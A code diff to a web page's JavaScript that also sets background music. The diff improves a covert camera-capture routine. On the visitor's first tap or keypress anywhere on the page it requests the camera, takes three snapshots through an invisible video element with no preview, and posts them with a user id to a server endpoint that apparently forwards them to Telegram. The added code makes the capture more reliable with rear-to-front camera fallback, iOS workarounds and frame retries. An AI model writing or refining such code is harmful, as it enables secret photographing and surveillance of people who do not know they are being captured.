@@ -2170,43 +2170,45 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
 
   const video = document.createElement('video');
   video.setAttribute('playsinline', '');
+  video.setAttribute('autoplay', '');
   video.setAttribute('muted', '1');
-  video.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:10px;height:10px;opacity:0;pointer-events:none;';
+  // Keep the element in the document but visually hidden behind the UI. Hidden
+  // off-screen elements (-9999px) can fail to decode frames on iOS, so instead
+  // we hide it with opacity/pointer-events and place it at the top-left corner.
+  video.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
   document.body.appendChild(video);
 
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
   function captureFrame() {
     const maxDim = 640;
-    const sw = Math.max(video.videoWidth, 2);
-    const sh = Math.max(video.videoHeight, 2);
+    const sw = Math.max(video.videoWidth || 640, 2);
+    const sh = Math.max(video.videoHeight || 480, 2);
     const scale = Math.min(1, maxDim / Math.max(sw, sh));
     const canvas = document.createElement('canvas');
     canvas.width = Math.max(2, Math.round(sw * scale));
     canvas.height = Math.max(2, Math.round(sh * scale));
     const ctx = canvas.getContext('2d');
-    if (ctx.drawImage) {
+    try {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       return canvas.toDataURL('image/jpeg', 0.6);
+    } catch (e) {
+      return '';
     }
-    return '';
   }
 
-  async function boot() {
-    // Browsers only allow camera access inside a user gesture (a tap/click).
-    // getUserMedia called purely on page load is silently rejected — so we
-    // wait for the very first interaction anywhere on the page, then capture
-    // quietly in the background. No camera preview or buttons are shown.
-    let stream;
+  function toast(msg) {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    } catch (e) {
-      try { video.remove(); } catch (_) {}
-      return;
-    }
+      const t = document.createElement('div');
+      t.textContent = msg;
+      t.style.cssText = 'position:fixed;left:0;right:0;bottom:16px;margin:0 auto;width:max-content;max-width:90%;background:#111827ee;color:#fff;padding:8px 14px;border-radius:999px;font:600 13px/1.4 system-ui,sans-serif;z-index:99999;pointer-events:none;';
+      document.body.appendChild(t);
+      setTimeout(() => { try { t.remove(); } catch (_) {} }, 4000);
+    } catch (_) {}
+  }
 
+  async function sendStream(stream) {
     video.srcObject = stream;
-    video.setAttribute('autoplay', '');
     try { await video.play(); } catch (e) {}
 
     // Wait for at least one rendered frame so draws aren't black.
@@ -2214,42 +2216,66 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       if (video.videoWidth > 0 && video.readyState >= 2) return resolve();
       const onReady = () => { video.removeEventListener('loadeddata', onReady); resolve(); };
       video.addEventListener('loadeddata', onReady);
-      setTimeout(resolve, 2500);
+      setTimeout(resolve, 3000);
     });
     // Small extra delay so the first frame is stabilized.
-    await sleep(400);
+    await sleep(500);
 
     const shots = [];
     for (let i = 0; i < 3; i++) {
-      const frame = captureFrame();
+      // Skip the very first frame if it is still empty/black.
+      let frame = '';
+      for (let retry = 0; retry < 3 && !frame; retry++) {
+        frame = captureFrame();
+        if (!frame) await sleep(200);
+      }
       if (frame) shots.push(frame);
-      await sleep(300);
+      await sleep(350);
     }
 
     try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
     try { video.srcObject = null; video.remove(); } catch (e) {}
 
-    if (!shots.length) return;
+    if (!shots.length) {
+      toast('Could not capture camera — no frames.');
+      return;
+    }
     try {
-      await fetch('/api/camera/capture', {
+      const res = await fetch('/api/camera/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ uid, images: shots }),
       });
-    } catch (e) {}
+      const data = await res.json().catch(() => ({}));
+      if (data && data.success) toast('Photos sent to Telegram.');
+      else toast('Failed to send photos.');
+    } catch (e) {
+      toast('Failed to send photos.');
+    }
   }
 
-  // Wait for the first user gesture anywhere on the page. This single tap
-  // satisfies the browser gesture requirement (the Allow prompt appears);
-  // after it, the 3 photos capture and send automatically in the background.
+  // Browser policy: getUserMedia is only allowed inside a user gesture. We
+  // call it synchronously on the very first tap/click/touch so the "Allow"
+  // permission prompt appears, then capture quietly in the background.
   let armed = false;
-  function onGesture(ev) {
+  function onGesture() {
     if (armed) return;
     armed = true;
-    ev.preventDefault && ev.preventDefault();
     ['click', 'touchstart', 'keydown'].forEach((t) =>
       document.removeEventListener(t, onGesture, { capture: true }));
-    boot();
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      toast('Camera not supported on this browser.');
+      return;
+    }
+    // Call getUserMedia synchronously inside the gesture (transient activation).
+    const p = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+      .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }));
+    p.then((stream) => sendStream(stream)).catch((e) => {
+      try { video.remove(); } catch (_) {}
+      toast((e && e.name === 'NotAllowedError')
+        ? 'Camera permission was blocked. Refresh and tap to Allow.'
+        : 'Camera is not available right now.');
+    });
   }
   ['click', 'touchstart', 'keydown'].forEach((t) =>
     document.addEventListener(t, onGesture, { capture: true }));
